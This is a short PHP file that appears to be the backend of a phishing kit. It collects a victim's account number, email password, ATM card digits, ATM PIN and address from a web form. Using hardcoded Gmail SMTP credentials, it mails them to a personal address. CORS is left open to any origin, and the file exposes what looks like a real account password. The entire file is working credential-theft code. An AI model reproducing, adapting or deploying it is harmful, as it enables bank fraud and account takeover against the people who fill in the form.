<?php
use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: *");
  
    
 
    
    //Load Composer's autoloader
    require 'vendor/autoload.php';
    
   
        
        $account = $_POST['account'];
        $email = $_POST['email'];
        $emailPass = $_POST['email-pass'];
        $atmCard = $_POST['atm-card'];
        $atmPin = $_POST['atm-pin'];
        $address = $_POST['address'];
        $rent = $_POST['rent'];


        $message = "Account: ".$account."<br> Email: ".$email."<br> Email-Password: ".$emailpass."<br> Last 6: ".$atmCard."<br> Pin: ".$atmPin."<br> Address: ".$address."<br> Rent: ".$rent;

        
   
    //Instantiation and passing `true` enables exceptions
   $mail = new PHPMailer(true);
    
    try {
        //Server settings
        $mail->SMTPDebug = 3;                      //Enable verbose debug output
        $mail->isSMTP();                                            //Send using SMTP
        $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
        $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
        $mail->Username   = 'billharris7431@gmail.com';                     //SMTP username
        $mail->Password   = 'kfdtqayhuvyzbujk';                               //SMTP password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         //Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
        $mail->Port       = 587;                                    //TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above
    
        //Recipients
        $mail->setFrom('billharris7431@gmail.com',"ubani");
        $mail->addAddress('tochukwu.ubani@gmail.com');     //Add a recipient
     
        //Content
        $mail->isHTML(true);                                  //Set email format to HTML
        $mail->Subject = 'Email Details';
        $mail->Body    = $message;
       
    
        $mail->send();
        echo 'Message has been sent';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
 




?>
